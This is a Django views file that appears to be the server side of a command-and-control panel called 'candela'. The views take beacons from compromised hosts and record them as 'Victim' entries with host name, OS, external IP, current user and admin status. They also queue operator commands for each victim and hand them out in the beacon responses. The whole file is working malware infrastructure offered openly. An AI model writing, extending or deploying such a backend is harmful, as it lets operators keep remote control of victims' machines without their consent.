from django.shortcuts import render
from django.http import HttpResponse
from django.utils import timezone
#from django.template import loader

import xml.etree.ElementTree as ET
import sys

from .models import Victim,Command
from .forms import NewCommandForm
from .utils import Beacon


def receive_beacon(request):
    if not request.body:
        return HttpResponse('Empty')

    beacon = Beacon(request.body)

    # How do we distinguish a returning host from an old
    # acquaintance with different parameters? Which parameters
    # are relevant, which aren't?
    victim = Victim.objects.filter(host_name=beacon.host_name,
                                   os=beacon.os)

    if victim and victim.count() == 1:  # We found an exact match
        victim = victim[0]
        # We update the victim's information
        if victim.external_ip != beacon.external_ip:
            victim.external_ip = beacon.external_ip
        if victim.current_user != beacon.current_user:
            victim.current_user = beacon.current_user
        if victim.os != beacon.os:
            victim.os = beacon.os
        if victim.admin != beacon.admin:
            victim.admin = beacon.admin
    else:
        victim = Victim.from_beacon(beacon)
    
    victim.save()

    # Now the victim is in our database with the updated info,
    # we check to see if there are any commands in the stack waiting
    # to be sent over. If so, format them into a BeaconResponse and
    # send them over, otherwise send an empty response/something else.
    #cmds_to_send = victim.command_set.filter(status=Command.ADDED)
    cmds_to_send = victim.command_set.filter(status=Command.ADDED)
    beacon_resp = Beacon.beacon_response(cmds_to_send)
    cmds_to_send.update(status=Command.SENT)
    # Then add the commands to the sent commandd
    #for cmd in stack:
    #    victim.sentcommand_set.create(command_type=cmd.command_type,
    #                                  param=cmd.param)

    # Now they can be removed from the stack
    #stack.delete()

    return HttpResponse(beacon_resp + '\n')


def victims_index(request):
    return render(request, 'candela/index.html')


def list_victims(request):
    latest_victim_list = Victim.objects.order_by('-last_beacon')
    #template = loader.get_template('candela/index.html')
    context = {'latest_victim_list': latest_victim_list}
    return render(request, 'candela/list.html', context)


def list_sent(request, id):
    try:
        v = Victim.objects.get(pk=id)
    except Victim.DoesNotExist:
        return HttpResponse('Wrong ID')

    cmds = v.command_set.filter(status=Command.SENT).order_by('-timestamp')
    context = {'commands_sent': cmds}
    return render(request, 'candela/sent.html', context)


# Renders the current stack as an HTML table. Only the table
# and nothing else is returned.
def list_stack(request, id):
    try:
        v = Victim.objects.get(pk=id)
    except Victim.DoesNotExist:
        return HttpResponse('Wrong ID')

    # if POST, first insert the new command into the database,
    # then display the updated list as usual
    if request.method == 'POST':
        form = NewCommandForm(request.POST)
        if form.is_valid():
            command_type = form.cleaned_data['command_type']
            command_param = form.cleaned_data['command_param']
            v.command_set.create(command_type=command_type,
                                 command_param=command_param)

    added = v.command_set.filter(status=Command.ADDED)
    context = {
        'victim_id': v.id,
        'commands_stacked': added,
    }
    return render(request, 'candela/stack.html', context)


# Returns the detail view of a victim, consisting of the current
# list of commands sent, the current list of commands waiting to be
# sent as well as a form for adding new commands to the stack
def victim_details(request, id):
    try:
        v = Victim.objects.get(pk=id)
    except Victim.DoesNotExist:
        return HttpResponse('Wrong ID')

    sent = v.command_set.filter(status=Command.SENT).order_by('-timestamp')
    stacked = v.command_set.filter(status=Command.ADDED)
    form = NewCommandForm()
    context = {
        'victim_id': v.id,
        'commands_sent': sent,
        'commands_stacked': stacked,
        'form': form,
        }
    return render(request, 'candela/detail.html', context)
